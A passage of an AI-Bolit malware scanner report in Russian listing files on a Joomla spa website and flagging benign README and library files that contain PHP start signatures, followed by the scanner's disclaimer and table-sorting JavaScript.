class="hidd">id_z1517192</div></td></tr><tr class="tbg1" o="id_z4094083"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/RU Promo SPA march 2016.jpg</a></div></td><td align=center><div class="ctd">08/11/2016 22:41:40</div></td><td align=center><div class="ctd">08/11/2016 22:41:40</div></td><td align=center><div class="ctd">722.46 Kb</div></td><td class="hidd"><div class="hidd">2b07cf2cae78770c3e541c6c76b14cc1eaca503f</div></td><td class="hidd"><div class="hidd">1478634100</div></td><td class="hidd"><div class="hidd">1478634100</div></td><td class="hidd"><div class="hidd">id_z4094083</div></td></tr><tr class="tbg0" o="id_z1650978"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/old/ENG Promo SPA march 2016.jpg</a></div></td><td align=center><div class="ctd">31/08/2016 23:35:16</div></td><td align=center><div class="ctd">11/05/2016 20:13:45</div></td><td align=center><div class="ctd">1,019.50 Kb</div></td><td class="hidd"><div class="hidd">4a491f21175bd3e099ee519f41eb6a2c5fbbd0b8</div></td><td class="hidd"><div class="hidd">1472675716</div></td><td class="hidd"><div class="hidd">1462986825</div></td><td class="hidd"><div class="hidd">id_z1650978</div></td></tr><tr class="tbg1" o="id_z2109936"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/old/RU Promo SPA march 2016.jpg</a></div></td><td align=center><div class="ctd">31/08/2016 23:35:16</div></td><td align=center><div class="ctd">11/05/2016 20:13:32</div></td><td align=center><div class="ctd">1.03 Mb</div></td><td class="hidd"><div class="hidd">bc524c96c8c8a6687e0b7c47c2703e90c1f7369e</div></td><td class="hidd"><div class="hidd">1472675716</div></td><td class="hidd"><div class="hidd">1462986812</div></td><td class="hidd"><div class="hidd">id_z2109936</div></td></tr><tr class="tbg0" o="id_z3622652"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/old/member card 2016 june rus finish.jpg</a></div></td><td align=center><div class="ctd">31/08/2016 23:35:16</div></td><td align=center><div class="ctd">31/08/2016 23:33:49</div></td><td align=center><div class="ctd">2.93 Mb</div></td><td class="hidd"><div class="hidd">bc524c96c8c8a6687e0b7c47c2703e90c1f7369e</div></td><td class="hidd"><div class="hidd">1472675716</div></td><td class="hidd"><div class="hidd">1472675629</div></td><td class="hidd"><div class="hidd">id_z3622652</div></td></tr><tr class="tbg1" o="id_z3505394"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/RU Promo Massage.jpg</a></div></td><td align=center><div class="ctd">09/11/2016 23:22:31</div></td><td align=center><div class="ctd">09/11/2016 23:22:31</div></td><td align=center><div class="ctd">688.67 Kb</div></td><td class="hidd"><div class="hidd">8556e9c25c1fcd8fa167724713ccdadd30b69523</div></td><td class="hidd"><div class="hidd">1478722951</div></td><td class="hidd"><div class="hidd">1478722951</div></td><td class="hidd"><div class="hidd">id_z3505394</div></td></tr><tr class="tbg0" o="id_z7374639"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/promotion/RUS Promo SPA march 2016.jpg</a></div></td><td align=center><div class="ctd">08/11/2016 22:36:08</div></td><td align=center><div class="ctd">08/11/2016 22:36:08</div></td><td align=center><div class="ctd">722.46 Kb</div></td><td class="hidd"><div class="hidd">8556e9c25c1fcd8fa167724713ccdadd30b69523</div></td><td class="hidd"><div class="hidd">1478633768</div></td><td class="hidd"><div class="hidd">1478633768</div></td><td class="hidd"><div class="hidd">id_z7374639</div></td></tr><tr class="tbg1" o="id_z2819013"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/pattara-2-.png</a></div></td><td align=center><div class="ctd">13/11/2015 18:38:46</div></td><td align=center><div class="ctd">13/11/2015 18:38:46</div></td><td align=center><div class="ctd">943.71 Kb</div></td><td class="hidd"><div class="hidd">ffd7aafb9a45b18fddaf6e618c23bc113ed310a2</div></td><td class="hidd"><div class="hidd">1447429126</div></td><td class="hidd"><div class="hidd">1447429126</div></td><td class="hidd"><div class="hidd">id_z2819013</div></td></tr><tr class="tbg0" o="id_z7570934"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/os_imagegallery_0/original/thai-center25.jpg</a></div></td><td align=center><div class="ctd">27/04/2015 12:19:49</div></td><td align=center><div class="ctd">27/04/2015 12:19:49</div></td><td align=center><div class="ctd">923.25 Kb</div></td><td class="hidd"><div class="hidd">1371484af05112945d424a153797fda7c354bb06</div></td><td class="hidd"><div class="hidd">1430126389</div></td><td class="hidd"><div class="hidd">1430126389</div></td><td class="hidd"><div class="hidd">id_z7570934</div></td></tr><tr class="tbg1" o="id_z5596979"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/os_imagegallery_0/original/thai-center26.jpg</a></div></td><td align=center><div class="ctd">27/04/2015 12:19:49</div></td><td align=center><div class="ctd">27/04/2015 12:19:49</div></td><td align=center><div class="ctd">1.09 Mb</div></td><td class="hidd"><div class="hidd">1371484af05112945d424a153797fda7c354bb06</div></td><td class="hidd"><div class="hidd">1430126389</div></td><td class="hidd"><div class="hidd">1430126389</div></td><td class="hidd"><div class="hidd">id_z5596979</div></td></tr><tr class="tbg0" o="id_z4536889"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/os_imagegallery_0/original/thai-center18.jpg</a></div></td><td align=center><div class="ctd">27/04/2015 12:19:49</div></td><td align=center><div class="ctd">27/04/2015 12:19:49</div></td><td align=center><div class="ctd">1.10 Mb</div></td><td class="hidd"><div class="hidd">1371484af05112945d424a153797fda7c354bb06</div></td><td class="hidd"><div class="hidd">1430126389</div></td><td class="hidd"><div class="hidd">1430126389</div></td><td class="hidd"><div class="hidd">id_z4536889</div></td></tr><tr class="tbg1" o="id_z2323388"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/os_imagegallery_0/original/thai-center24.jpg</a></div></td><td align=center><div class="ctd">27/04/2015 12:19:50</div></td><td align=center><div class="ctd">27/04/2015 12:19:50</div></td><td align=center><div class="ctd">1.08 Mb</div></td><td class="hidd"><div class="hidd">1371484af05112945d424a153797fda7c354bb06</div></td><td class="hidd"><div class="hidd">1430126390</div></td><td class="hidd"><div class="hidd">1430126390</div></td><td class="hidd"><div class="hidd">id_z2323388</div></td></tr><tr class="tbg0" o="id_z8036247"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/images/activity/Thai_Embassy_Women_Party/Thumbs.db</a></div></td><td align=center><div class="ctd">28/04/2015 11:03:01</div></td><td align=center><div class="ctd">28/04/2015 11:03:01</div></td><td align=center><div class="ctd">653.50 Kb</div></td><td class="hidd"><div class="hidd">32fc220486ee308a6d13fae59cd1ee1bf1ba1f2f</div></td><td class="hidd"><div class="hidd">1430208181</div></td><td class="hidd"><div class="hidd">1430208181</div></td><td class="hidd"><div class="hidd">id_z8036247</div></td></tr><tr class="tbg1" o="id_z1898990"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/tmp/Joomla_3.4.x_to_3.4.8-Stable-Patch_Package.zip</a></div></td><td align=center><div class="ctd">22/01/2016 08:59:57</div></td><td align=center><div class="ctd">22/01/2016 08:59:57</div></td><td align=center><div class="ctd">3.96 Mb</div></td><td class="hidd"><div class="hidd">f6b528f8817fa2d6db0d76f70133f1225cd862b7</div></td><td class="hidd"><div class="hidd">1453442397</div></td><td class="hidd"><div class="hidd">1453442397</div></td><td class="hidd"><div class="hidd">id_z1898990</div></td></tr></tbody></table></div><div class=clear style="margin: 20px 0 0 0"></div></div><div class="note_warn">В не .php файле содержится стартовая сигнатура PHP кода. Возможно, там вредоносный код</div><div class="warn"><div class="flist"><table cellspacing=1 cellpadding=4 border=0 id="table_8522157"><thead><tr class="tbgh0"><th width=70%>Путь</th><th>Изменение свойств</th><th>Изменение содержимого</th><th width=90>Размер</th><th width=0 class="hidd">CRC32</th><th width=0 class="hidd"></th><th width=0 class="hidd"></th><th width=0 class="hidd"></th></tr></thead><tbody><tr class="tbg0" o="id_z1032120"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/includes/PHPMailer/README.md</a></div><div class="details"><span class="line_no">1</span>…equire &#039;PHPMailerAutoload.php&#039;;$mail=new PHPMailer;$mail-&gt;isSMTP();$mail-&gt;Host=&#039;<span class="marker">&nbsp;</span>smtp1.example.com;smtp2.example.com&#039;;$mail-&gt;SMTPAuth=true;$mail-&gt;Username=&#039;user</div></td><td align=center><div class="ctd">27/04/2015 12:20:04</div></td><td align=center><div class="ctd">27/04/2015 12:20:04</div></td><td align=center><div class="ctd">10.33 Kb</div></td><td class="hidd"><div class="hidd">2b475b1b6b860dd0e6de5652d03f51fa91f67bbe</div></td><td class="hidd"><div class="hidd">1430126404</div></td><td class="hidd"><div class="hidd">1430126404</div></td><td class="hidd"><div class="hidd">id_z1032120</div></td></tr><tr class="tbg1" o="id_z8492133"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/administrator/components/com_akeeba/assets/installers/kickstart.txt</a></div><div class="details"><span class="line_no">2</span>…<span class="marker">&nbsp;</span></div></td><td align=center><div class="ctd">14/10/2016 19:20:55</div></td><td align=center><div class="ctd">14/10/2016 19:20:55</div></td><td align=center><div class="ctd">323.23 Kb</div></td><td class="hidd"><div class="hidd">1f9c91ace2f4a5940881aac46c5d6b9f6ca99d99</div></td><td class="hidd"><div class="hidd">1476462055</div></td><td class="hidd"><div class="hidd">1476462055</div></td><td class="hidd"><div class="hidd">id_z8492133</div></td></tr><tr class="tbg0" o="id_z5099070"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/templates/full_screen_6/css/media_queries.original.css</a></div><div class="details"><span class="line_no">1</span>…<span class="marker">&nbsp;</span></div></td><td align=center><div class="ctd">06/05/2015 23:13:18</div></td><td align=center><div class="ctd">06/05/2015 23:13:18</div></td><td align=center><div class="ctd">15.67 Kb</div></td><td class="hidd"><div class="hidd">a6badad8fe011fdcdd352462e34d8478f0575f20</div></td><td class="hidd"><div class="hidd">1430943198</div></td><td class="hidd"><div class="hidd">1430943198</div></td><td class="hidd"><div class="hidd">id_z5099070</div></td></tr><tr class="tbg1" o="id_z1877984"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/libraries/phputf8/README</a></div><div class="details"><span class="line_no">1</span>…PHP Version: &quot;.phpversion().&quot;&lt;br&gt;&quot;;if(extension_loaded(&#039;mbstring&#039;)){print &quot;mbstr<span class="marker">&nbsp;</span>ing available&lt;br&gt;&quot;;}else{print &quot;mbstring not available&lt;br&gt;&quot;;}if(extension_loade</div></td><td align=center><div class="ctd">21/12/2016 13:11:13</div></td><td align=center><div class="ctd">11/12/2016 21:51:10</div></td><td align=center><div class="ctd">3.29 Kb</div></td><td class="hidd"><div class="hidd">0db68ab318128db056781e41bcc4064f2f8afa33</div></td><td class="hidd"><div class="hidd">1482315073</div></td><td class="hidd"><div class="hidd">1481482270</div></td><td class="hidd"><div class="hidd">id_z1877984</div></td></tr><tr class="tbg0" o="id_z7431220"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/libraries/idna_convert/ReadMe.txt</a></div><div class="details"><span class="line_no">1</span>…at,with one major exception: UCS-4 array is jsut an array,where each value repre<span class="marker">&nbsp;</span>sents one codepoint in the string,i.e.every value is a 32bit integer value.Exam</div></td><td align=center><div class="ctd">21/12/2016 13:10:33</div></td><td align=center><div class="ctd">11/12/2016 21:51:10</div></td><td align=center><div class="ctd">7.48 Kb</div></td><td class="hidd"><div class="hidd">453d4b17886081545040e7d8c2387ef817e32fae</div></td><td class="hidd"><div class="hidd">1482315033</div></td><td class="hidd"><div class="hidd">1481482270</div></td><td class="hidd"><div class="hidd">id_z7431220</div></td></tr><tr class="tbg1" o="id_z5895756"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/libraries/vendor/joomla/string/src/phputf8/README</a></div><div class="details"><span class="line_no">1</span>…e used to determine this information;&lt;?php print &quot;PHP Version: &quot;.phpversion().&quot;&lt;<span class="marker">&nbsp;</span>br&gt;&quot;;if(extension_loaded(&#039;mbstring&#039;)){print &quot;mbstring available&lt;br&gt;&quot;;}else{prin</div></td><td align=center><div class="ctd">21/12/2016 13:11:15</div></td><td align=center><div class="ctd">11/12/2016 21:51:10</div></td><td align=center><div class="ctd">3.21 Kb</div></td><td class="hidd"><div class="hidd">0db68ab318128db056781e41bcc4064f2f8afa33</div></td><td class="hidd"><div class="hidd">1482315075</div></td><td class="hidd"><div class="hidd">1481482270</div></td><td class="hidd"><div class="hidd">id_z5895756</div></td></tr><tr class="tbg0" o="id_z1213570"><td><div class="it"><a class="it">/var/www/user7119/data/www/thaipattaraspa_2015/libraries/vendor/leafo/lessphp/lessify</a></div><div class="details"><span class="line_no">1</span>#!/usr/bin/php&lt;<span class="marker">&nbsp;</span>?php if(php_sapi_name()!=&quot;cli&quot;){err($fa.$argv[0].&quot; must be run in the command l</div></td><td align=center><div class="ctd">21/12/2016 13:11:17</div></td><td align=center><div class="ctd">11/12/2016 21:51:10</div></td><td align=center><div class="ctd">413 b</div></td><td class="hidd"><div class="hidd">4039bbca86d9fb0fbe8f4c64e60c18a13a9207ab</div></td><td class="hidd"><div class="hidd">1482315077</div></td><td class="hidd"><div class="hidd">1481482270</div></td><td class="hidd"><div class="hidd">id_z1213570</div></td></tr></tbody></table></div><div class=clear style="margin: 20px 0 0 0"></div></div>
+<div class="note_warn">Версии найденных CMS<br/>Joomla v0.0</div>
+ 
+	<div class="footer">
+	   <div class="disclaimer"><span class="vir">[!]</span> Отказ от гарантий: невозможно гарантировать обнаружение всех вредоносных скриптов. Поэтому разработчик сканера не несет ответственности за возможные последствия работы сканера AI-Bolit или неоправданные ожидания пользователей относительно функциональности и возможностей.
+   </div>
+   <div class="thanx">
+      Замечания и предложения по работе скрипта, а также не обнаруженные вредоносные скрипты вы можете присылать на <a href="mailto:ai@revisium.com">ai@revisium.com</a>.<br/>
+      Также будем чрезвычайно благодарны за любые упоминания сканера AI-Bolit на вашем сайте, в блоге, среди друзей, знакомых и клиентов. <br/>Ссылку можно поставить на страницу <a href="https://revisium.com/ai/">https://revisium.com/ai/</a>.<br/> 
+     <p>Получить консультацию или задать вопросы можно по email <a href="mailto:ai@revisium.com">ai@revisium.com</a>.</p> 
+	</div>
+	</div>
+	
+<script language="javascript">
+
+function hsig(id) {
+  var divs = document.getElementsByTagName("tr");
+  for(var i = 0; i < divs.length; i++){
+     
+     if (divs[i].getAttribute('o') == id) {
+        divs[i].innerHTML = '';
+     }
+  }
+
+  return false;
+}
+
+
+$(document).ready(function(){
+    $('#table_crit').dataTable({
+       "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+       "aoColumns": [
+                                     {"iDataSort": 7, "width":"70%"},
+                                     {"iDataSort": 5},
+                                     {"iDataSort": 6},
+                                     {"bSortable": true},
+                                     {"bVisible": false},
+                                     {"bVisible": false},
+                                     {"bVisible": false},
+                                     {"bVisible": false}
+                     ],
+		"paging": true,
+       "iDisplayLength": 500,
+		"oLanguage": {
+			"sLengthMenu": "Отображать по _MENU_ записей",
+			"sZeroRecords": "Ничего не найдено",
+			"sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+			"sInfoEmpty": "Нет файлов",
+			"sInfoFiltered": "(всего записей _MAX_)",
+			"sSearch":       "Поиск:",
+			"sUrl":          "",
+			"oPaginate": {
+				"sFirst": "Первая",
+				"sPrevious": "Предыдущая",
+				"sNext": "Следующая",
+				"sLast": "Последняя"
+			},
+			"oAria": {
+				"sSortAscending": ": активировать для сортировки столбца по возрастанию",
+				"sSortDescending": ": активировать для сортировки столбцов по убыванию"	
+			}
+		}
+
+     } );
+
+});
+
+$(document).ready(function(){
+    $('#table_vir').dataTable({
+       "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+		"paging": true,
+       "aoColumns": [
+                                     {"iDataSort": 7, "width":"70%"},
+                                     {"iDataSort": 5},
+                                     {"iDataSort": 6},
+                                     {"bSortable": true},
+                                     {"bVisible": false},
+                                     {"bVisible": false},
+                                     {"bVisible": false},
+                                     {"bVisible": false}
+                     ],
+       "iDisplayLength": 500,
+		"oLanguage": {
+			"sLengthMenu": "Отображать по _MENU_ записей",
+			"sZeroRecords": "Ничего не найдено",
+			"sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+			"sInfoEmpty": "Нет файлов",
+			"sInfoFiltered": "(всего записей _MAX_)",
+			"sSearch":       "Поиск:",
+			"sUrl":          "",
+			"oPaginate": {
+				"sFirst": "Первая",
+				"sPrevious": "Предыдущая",
+				"sNext": "Следующая",
+				"sLast": "Последняя"
+			},
+			"oAria": {
+				"sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+				"sSortDescending": ": активировать для сортировки столбцов по убыванию"	
+			}
+		},
+
+     } );
+
+});
+
+if ($('#table_warn0')) {
+    $('#table_warn0').dataTable({
+       "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+		"paging": true,
+       "aoColumns": [
+                                     {"iDataSort": 7, "width":"70%"},
+                                     {"iDataSort": 5},
+                                     {"iDataSort": 6},
+                                     {"bSortable": true},
+                                     {"bVisible": false},
+                                     {"bVisible": false},
+                                     {"bVisible": false},
+                                     {"bVisible": false}
+                     ],
+			         "iDisplayLength": 500,
+			  		"oLanguage": {
+			  			"sLengthMenu": "Отображать по _MENU_ записей",
+			  			"sZeroRecords": "Ничего не найдено",
+			  			"sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+			  			"sInfoEmpty": "Нет файлов",
+			  			"sInfoFiltered": "(всего записей _MAX_)",
+			  			"sSearch":       "Поиск:",
+			  			"sUrl":          "",
+			  			"oPaginate": {
+			  				"sFirst": "Первая",
+			  				"sPrevious": "Предыдущая",
+			  				"sNext": "Следующая",
+			  				"sLast": "Последняя"
+			  			},
+			  			"oAria": {
+			  				"sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+			  				"sSortDescending": ": активировать для сортировки столбцов по убыванию"	
+			  			}
+		}
+
+     } );
+}
+
+if ($('#table_warn1')) {
+    $('#table_warn1').dataTable({
+       "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+		"paging": true,
+       "aoColumns": [
+                                     {"iDataSort": 7, "width":"70%"},
+                                     {"iDataSort": 5},
+                                     {"iDataSort": 6},
+                                     {"bSortable": true},
+                                     {"bVisible": false},
+                                     {"bVisible": false},
+                                     {"bVisible": false},
+                                     {"bVisible": false}
+                     ],
+			         "iDisplayLength": 500,
+			  		"oLanguage": {
+			  			"sLengthMenu": "Отображать по _MENU_ записей",
+			  			"sZeroRecords": "Ничего не найдено",
+			  			"sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+			  			"sInfoEmpty": "Нет файлов",
+			  			"sInfoFiltered": "(всего записей _MAX_)",
+			  			"sSearch":       "Поиск:",
+			  			"sUrl":          "",
+			  			"oPaginate": {
+			  				"sFirst": "Первая",
+			  				"sPrevious": "Предыдущая",
+			  				"sNext": "Следующая",
+			  				"sLast": "Последняя"
+			  			},
+			  			"oAria": {
+			  				"sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+			  				"sSortDescending": ": активировать для сортировки столбцов по убыванию"	
+			  			}
+		}
+
+     } );
+}
+
+
+</script>
+<!-- [][0]  -->
+ </body>
+</html>
